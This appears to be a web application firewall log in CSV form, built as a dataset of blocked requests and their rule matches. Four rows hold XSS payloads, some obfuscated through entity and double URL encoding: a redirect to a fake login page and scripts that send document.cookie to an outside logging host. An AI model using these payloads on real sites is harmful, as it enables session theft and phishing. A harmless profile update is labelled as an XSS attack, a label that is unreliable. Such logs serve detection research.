Timestamp,TransactionID,ClientIP,ClientPort,ServerIP,ServerPort,RequestMethod,RequestURIPath,RequestURIQuery,RequestProtocol,UserAgent,Referer,AcceptEncoding,ContentType,Accept,Cookie,Connection,OtherHeaders,RequestBody,ResponseStatus,ResponseProtocol,ResponseHeaders,ResponseBody,WAFInterrupted,InterruptionRuleID,InterruptionStatus,InterruptionAction,MatchedRulesCount,MatchedRulesIDs,MatchedRulesMessages,MatchedRulesTags,AIScore,AIVerdict,AIVerdictLabel,AIVulnerabilityTypeLabel,RequestLength,PathLength,QueryLength,BodyLength,NumParams,LongestParamValueLength,NumSpecialChars,NumEncodedChars,NumDoubleEncodedChars,RatioSpecialCharsToTotalChars,NumKeywords,NumUniqueChars,IsJSONBody,IsXMLBody,IsMultipartForm,HasNumericPathSegment,DepthOfPath,UsesBase64Encoding,UsesHexEncoding,HasMultipleContentLength,InvalidHTTPVersion,NumHTTPHeaders,TimeOfDayHour,TimeOfDayDayOfWeek
2025-07-08T20:27:32Z,hDIfCJJELRhNqPrCulg,172.19.0.4,49154,coraza-proxy,8080,GET,/rest/products/search,term=%253Csvg%252Fonchange%253Dwindow.location.href%2B%253D%2B%2522https%253A%252F%252Fpankofamerika.com%252Ffake_login%2522%253B%253E,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,,,,true,949110,403,deny,68,900990;901100;901110;901111;901115;901120;901125;901130;901140;901141;901142;901143;901160;901162;901168;901163;901164;901165;901171;901167;901169;901170;901200;901340;901400;911013;913013;920280;920013;921013;930013;931013;932013;933013;934013;941010;941013;942013;943013;944013;949052;949152;949013;980013;911014;913014;920014;921014;930014;931014;932014;933014;934014;941100;941160;941180;941014;942014;943014;944014;949059;949159;949060;949160;949110;980099;980044;980170,";;;;;;;;;;;;;;;;;;;;;;;Enabling body inspection;;;;Request Missing a Host Header;;;;;;;;;;;;;;;;;;;;;;;;;;XSS Attack Detected via libinjection;NoScript XSS InjectionChecker: HTML Injection;Node-Validator Deny List Keywords;;;;;;;;;Inbound Anomaly Score Exceeded (Total Score: 18);;;Anomaly Scores: (Inbound Scores: blocking=18, detection=18, per_pl=18-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=15, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=18)",OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;application-multi;language-multi;platform-multi;attack-protocol;paranoia-level/1;OWASP_CRS;OWASP_CRS/PROTOCOL-ENFORCEMENT;capec/1000/210/272;PCI/6.5.10;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS/ATTACK-XSS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;anomaly-evaluation;OWASP_CRS;OWASP_CRS;OWASP_CRS;reporting;OWASP_CRS,-1.00,not evaluated,malicious,xss,330,21,134,0,1,101,21,14,12,0.1355,2,34,false,false,false,false,3,false,true,false,false,4,20,Tuesday
2025-07-08T20:27:32Z,JJMoUFJpicgmANRQQbT,172.19.0.4,49194,coraza-proxy,8080,GET,/rest/products/search,data=%26%23x3c%3B%26%23x62%3B%26%23x4f%3B%26%23x64%3B%26%23x79%3B%26%23x20%3B%26%23x4f%3B%26%23x6e%3B%26%23x4c%3B%26%23x6f%3B%26%23x61%3B%26%23x64%3B%26%23x3d%3B%26%23x6e%3B%26%23x45%3B%26%23x77%3B%26%23x20%3B%26%23x49%3B%26%23x6d%3B%26%23x61%3B%26%23x67%3B%26%23x65%3B%26%23x28%3B%26%23x29%3B%26%23x2e%3B%26%23x53%3B%26%23x72%3B%26%23x63%3B%26%23x20%3B%26%23x3d%3B%26%23x20%3B%26%23x22%3B%26%23x48%3B%26%23x54%3B%26%23x74%3B%26%23x50%3B%26%23x73%3B%26%23x3a%3B%26%23x2f%3B%26%23x2f%3B%26%23x77%3B%26%23x65%3B%26%23x6e%3B%26%23x6f%3B%26%23x6a%3B%26%23x68%3B%26%23x44%3B%26%23x53%3B%26%23x6b%3B%26%23x64%3B%26%23x53%3B%26%23x46%3B%26%23x2e%3B%26%23x63%3B%26%23x4f%3B%26%23x4d%3B%26%23x2f%3B%26%23x4c%3B%26%23x6f%3B%26%23x67%3B%26%23x5f%3B%26%23x43%3B%26%23x6f%3B%26%23x6f%3B%26%23x6b%3B%26%23x69%3B%26%23x45%3B%26%23x2e%3B%26%23x70%3B%26%23x68%3B%26%23x70%3B%26%23x3f%3B%26%23x43%3B%26%23x3d%3B%26%23x22%3B%26%23x20%3B%26%23x2b%3B%26%23x20%3B%26%23x44%3B%26%23x6f%3B%26%23x43%3B%26%23x55%3B%26%23x4d%3B%26%23x65%3B%26%23x6e%3B%26%23x54%3B%26%23x2e%3B%26%23x63%3B%26%23x4f%3B%26%23x4f%3B%26%23x6b%3B%26%23x49%3B%26%23x65%3B%26%23x3b%3B%26%23x3e%3B,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",,*/*,,keep-alive,,,,,,,true,949110,403,deny,68,900990;901100;901110;901111;901115;901120;901125;901130;901140;901141;901142;901143;901160;901162;901168;901163;901164;901165;901171;901167;901169;901170;901200;901340;901400;911013;913013;920280;920013;921013;930013;931013;932013;933013;934013;941010;941013;942013;943013;944013;949052;949152;949013;980013;911014;913014;920014;921014;930014;931014;932014;933014;934014;941100;941160;941180;941014;942014;943014;944014;949059;949159;949060;949160;949110;980099;980044;980170,";;;;;;;;;;;;;;;;;;;;;;;Enabling body inspection;;;;Request Missing a Host Header;;;;;;;;;;;;;;;;;;;;;;;;;;XSS Attack Detected via libinjection;NoScript XSS InjectionChecker: HTML Injection;Node-Validator Deny List Keywords;;;;;;;;;Inbound Anomaly Score Exceeded (Total Score: 18);;;Anomaly Scores: (Inbound Scores: blocking=18, detection=18, per_pl=18-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=15, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=18)",OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;application-multi;language-multi;platform-multi;attack-protocol;paranoia-level/1;OWASP_CRS;OWASP_CRS/PROTOCOL-ENFORCEMENT;capec/1000/210/272;PCI/6.5.10;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS/ATTACK-XSS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;anomaly-evaluation;OWASP_CRS;OWASP_CRS;OWASP_CRS;reporting;OWASP_CRS,-1.00,not evaluated,malicious,xss,1406,21,1145,0,1,570,288,285,0,0.2470,0,28,false,false,false,false,3,false,true,false,false,4,20,Tuesday
2025-07-08T20:27:32Z,zpVWQvHLFPAEUJkgcGU,172.19.0.4,49206,coraza-proxy,8080,GET,/rest/products/search,query=%2526%2523%2578%2536%2534%253b%2526%2523%2578%2536%2531%253b%2526%2523%2578%2537%2534%253b%2526%2523%2578%2536%2531%253b%2526%2523%2578%2533%2561%253b%2526%2523%2578%2537%2534%253b%2526%2523%2578%2536%2535%253b%2526%2523%2578%2537%2538%253b%2526%2523%2578%2537%2534%253b%2526%2523%2578%2532%2566%253b%2526%2523%2578%2536%2538%253b%2526%2523%2578%2537%2534%253b%2526%2523%2578%2536%2564%253b%2526%2523%2578%2536%2563%253b%2526%2523%2578%2532%2563%253b%2526%2523%2578%2532%2535%253b%2526%2523%2578%2533%2533%253b%2526%2523%2578%2534%2533%253b%2526%2523%2578%2537%2533%253b%2526%2523%2578%2536%2533%253b%2526%2523%2578%2537%2532%253b%2526%2523%2578%2536%2539%253b%2526%2523%2578%2537%2530%253b%2526%2523%2578%2537%2534%253b%2526%2523%2578%2532%2535%253b%2526%2523%2578%2533%2533%253b%2526%2523%2578%2534%2535%253b%2526%2523%2578%2536%2534%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2533%253b%2526%2523%2578%2537%2535%253b%2526%2523%2578%2536%2564%253b%2526%2523%2578%2536%2535%253b%2526%2523%2578%2536%2565%253b%2526%2523%2578%2537%2534%253b%2526%2523%2578%2532%2565%253b%2526%2523%2578%2536%2532%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2534%253b%2526%2523%2578%2537%2539%253b%2526%2523%2578%2532%2565%253b%2526%2523%2578%2536%2539%253b%2526%2523%2578%2536%2565%253b%2526%2523%2578%2536%2565%253b%2526%2523%2578%2536%2535%253b%2526%2523%2578%2537%2532%253b%2526%2523%2578%2534%2538%253b%2526%2523%2578%2535%2534%253b%2526%2523%2578%2534%2564%253b%2526%2523%2578%2534%2563%253b%2526%2523%2578%2532%2562%253b%2526%2523%2578%2532%2535%253b%2526%2523%2578%2533%2533%253b%2526%2523%2578%2534%2534%253b%2526%2523%2578%2532%2562%253b%2526%2523%2578%2532%2535%253b%2526%2523%2578%2533%2532%253b%2526%2523%2578%2533%2537%253b%2526%2523%2578%2532%2535%253b%2526%2523%2578%2533%2533%253b%2526%2523%2578%2534%2533%253b%2526%2523%2578%2536%2538%253b%2526%2523%2578%2533%2531%253b%2526%2523%2578%2532%2535%253b%2526%2523%2578%2533%2533%253b%2526%2523%2578%2534%2535%253b%2526%2523%2578%2535%2534%253b%2526%2523%2578%2537%2532%253b%2526%2523%2578%2537%2535%253b%2526%2523%2578%2537%2533%253b%2526%2523%2578%2537%2534%253b%2526%2523%2578%2532%2562%253b%2526%2523%2578%2536%2564%253b%2526%2523%2578%2536%2535%253b%2526%2523%2578%2532%2535%253b%2526%2523%2578%2533%2532%253b%2526%2523%2578%2533%2531%253b%2526%2523%2578%2532%2535%253b%2526%2523%2578%2533%2533%253b%2526%2523%2578%2534%2533%253b%2526%2523%2578%2532%2535%253b%2526%2523%2578%2533%2532%253b%2526%2523%2578%2534%2536%253b%2526%2523%2578%2536%2538%253b%2526%2523%2578%2533%2531%253b%2526%2523%2578%2532%2535%253b%2526%2523%2578%2533%2533%253b%2526%2523%2578%2534%2535%253b%2526%2523%2578%2532%2535%253b%2526%2523%2578%2533%2533%253b%2526%2523%2578%2534%2533%253b%2526%2523%2578%2537%2530%253b%2526%2523%2578%2532%2535%253b%2526%2523%2578%2533%2533%253b%2526%2523%2578%2534%2535%253b%2526%2523%2578%2534%2533%253b%2526%2523%2578%2536%2531%253b%2526%2523%2578%2536%2563%253b%2526%2523%2578%2536%2563%253b%2526%2523%2578%2532%2562%253b%2526%2523%2578%2536%2564%253b%2526%2523%2578%2536%2535%253b%2526%2523%2578%2532%2562%253b%2526%2523%2578%2536%2531%253b%2526%2523%2578%2537%2534%253b%2526%2523%2578%2532%2562%253b%2526%2523%2578%2533%2531%253b%2526%2523%2578%2532%2562%253b%2526%2523%2578%2533%2538%253b%2526%2523%2578%2533%2538%253b%2526%2523%2578%2533%2538%253b%2526%2523%2578%2532%2562%253b%2526%2523%2578%2533%2533%253b%2526%2523%2578%2533%2534%253b%2526%2523%2578%2533%2535%253b%2526%2523%2578%2532%2562%253b%2526%2523%2578%2533%2538%253b%2526%2523%2578%2533%2534%253b%2526%2523%2578%2533%2534%253b%2526%2523%2578%2533%2533%253b%2526%2523%2578%2532%2565%253b%2526%2523%2578%2532%2535%253b%2526%2523%2578%2533%2533%253b%2526%2523%2578%2534%2533%253b%2526%2523%2578%2532%2535%253b%2526%2523%2578%2533%2532%253b%2526%2523%2578%2534%2536%253b%2526%2523%2578%2537%2530%253b%2526%2523%2578%2532%2535%253b%2526%2523%2578%2533%2533%253b%2526%2523%2578%2534%2535%253b%2526%2523%2578%2532%2535%253b%2526%2523%2578%2533%2532%253b%2526%2523%2578%2533%2537%253b%2526%2523%2578%2532%2535%253b%2526%2523%2578%2533%2533%253b%2526%2523%2578%2534%2532%253b%2526%2523%2578%2532%2535%253b%2526%2523%2578%2533%2533%253b%2526%2523%2578%2534%2533%253b%2526%2523%2578%2532%2535%253b%2526%2523%2578%2533%2532%253b%2526%2523%2578%2534%2536%253b%2526%2523%2578%2537%2533%253b%2526%2523%2578%2536%2533%253b%2526%2523%2578%2537%2532%253b%2526%2523%2578%2536%2539%253b%2526%2523%2578%2537%2530%253b%2526%2523%2578%2537%2534%253b%2526%2523%2578%2532%2535%253b%2526%2523%2578%2533%2533%253b%2526%2523%2578%2534%2535%253b,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,,,,true,949110,403,deny,68,900990;901100;901110;901111;901115;901120;901125;901130;901140;901141;901142;901143;901160;901162;901168;901163;901164;901165;901171;901167;901169;901170;901200;901340;901400;911013;913013;920280;920013;921013;930013;931013;932013;933013;934013;941010;941013;942013;943013;944013;949052;949152;949013;980013;911014;913014;920014;921014;930014;931014;932014;933014;934014;941130;941170;941180;941014;942014;943014;944014;949059;949159;949060;949160;949110;980099;980044;980170,";;;;;;;;;;;;;;;;;;;;;;;Enabling body inspection;;;;Request Missing a Host Header;;;;;;;;;;;;;;;;;;;;;;;;;;XSS Filter - Category 3: Attribute Vector;NoScript XSS InjectionChecker: Attribute Injection;Node-Validator Deny List Keywords;;;;;;;;;Inbound Anomaly Score Exceeded (Total Score: 18);;;Anomaly Scores: (Inbound Scores: blocking=18, detection=18, per_pl=18-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=15, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=18)",OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;application-multi;language-multi;platform-multi;attack-protocol;paranoia-level/1;OWASP_CRS;OWASP_CRS/PROTOCOL-ENFORCEMENT;capec/1000/210/272;PCI/6.5.10;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS/ATTACK-XSS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;anomaly-evaluation;OWASP_CRS;OWASP_CRS;OWASP_CRS;reporting;OWASP_CRS,-1.00,not evaluated,malicious,xss,4803,21,4566,0,1,2736,915,912,912,0.1995,0,27,false,false,false,false,3,false,true,false,false,4,20,Tuesday
2025-07-08T20:27:33Z,PcXqOQyHnZUIemRDTLp,172.19.0.4,49292,coraza-proxy,8080,PUT,/profile,,HTTP/1.1,"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/125.0.6422.76 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:64,"{""email"": ""updated_user4@example.com"", ""address"": ""123 Main St""}",,,,,true,949110,403,deny,66,900990;901100;901110;901111;901115;901120;901125;901130;901140;901141;901142;901143;901160;901162;901168;901163;901164;901165;901171;901167;901169;901170;901200;901340;901400;911100;911013;913013;920280;920013;921013;930013;931013;932013;933013;934013;941010;941013;942013;943013;944013;949052;949152;949013;980013;911014;913014;920014;921014;930014;931014;932014;933014;934014;941014;942014;943014;944014;949059;949159;949060;949160;949110;980099;980044;980170,";;;;;;;;;;;;;;;;;;;;;;;Enabling body inspection;;Method is not allowed by policy;;;Request Missing a Host Header;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;Inbound Anomaly Score Exceeded (Total Score: 8);;;Anomaly Scores: (Inbound Scores: blocking=8, detection=8, per_pl=8-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=0, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=8)",OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;application-multi;language-multi;platform-multi;attack-generic;paranoia-level/1;OWASP_CRS;OWASP_CRS/METHOD-ENFORCEMENT;capec/1000/210/272/220/274;PCI/12.1;OWASP_CRS;OWASP_CRS;application-multi;language-multi;platform-multi;attack-protocol;paranoia-level/1;OWASP_CRS;OWASP_CRS/PROTOCOL-ENFORCEMENT;capec/1000/210/272;PCI/6.5.10;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS/ATTACK-XSS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;anomaly-evaluation;OWASP_CRS;OWASP_CRS;OWASP_CRS;reporting;OWASP_CRS,-1.00,not evaluated,malicious,xss,359,8,0,64,2,25,17,0,0,0.2361,0,32,true,false,false,false,1,true,false,false,false,6,20,Tuesday
2025-07-08T20:27:33Z,zBeqTWblJrChqwctHOv,172.19.0.4,49268,coraza-proxy,8080,GET,/rest/products/search,id=%3Cimg+src%3Dx+onmouseover%3Dnew+Image%28%29.src+%3D+%22https%3A%2F%2Fwenojhdskdsf.com%2Flog_cookie.php%3Fc%3D%22+%2B+document.cookie%3B%3E,HTTP/1.1,"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,,,,true,949110,403,deny,68,900990;901100;901110;901111;901115;901120;901125;901130;901140;901141;901142;901143;901160;901162;901168;901163;901164;901165;901171;901167;901169;901170;901200;901340;901400;911013;913013;920280;920013;921013;930013;931013;932013;933013;934013;941010;941013;942013;943013;944013;949052;949152;949013;980013;911014;913014;920014;921014;930014;931014;932014;933014;934014;941100;941160;941180;941014;942014;943014;944014;949059;949159;949060;949160;949110;980099;980044;980170,";;;;;;;;;;;;;;;;;;;;;;;Enabling body inspection;;;;Request Missing a Host Header;;;;;;;;;;;;;;;;;;;;;;;;;;XSS Attack Detected via libinjection;NoScript XSS InjectionChecker: HTML Injection;Node-Validator Deny List Keywords;;;;;;;;;Inbound Anomaly Score Exceeded (Total Score: 18);;;Anomaly Scores: (Inbound Scores: blocking=18, detection=18, per_pl=18-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=0, XSS=15, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=18)",OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;application-multi;language-multi;platform-multi;attack-protocol;paranoia-level/1;OWASP_CRS;OWASP_CRS/PROTOCOL-ENFORCEMENT;capec/1000/210/272;PCI/6.5.10;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS/ATTACK-XSS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;application-multi;language-multi;platform-multi;attack-xss;xss-perf-disable;paranoia-level/1;OWASP_CRS;OWASP_CRS/ATTACK-XSS;capec/1000/152/242;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;OWASP_CRS;anomaly-evaluation;OWASP_CRS;OWASP_CRS;OWASP_CRS;reporting;OWASP_CRS,-1.00,not evaluated,malicious,xss,414,21,142,0,1,105,32,17,0,0.1963,1,39,false,false,false,false,3,false,true,false,false,4,20,Tuesday
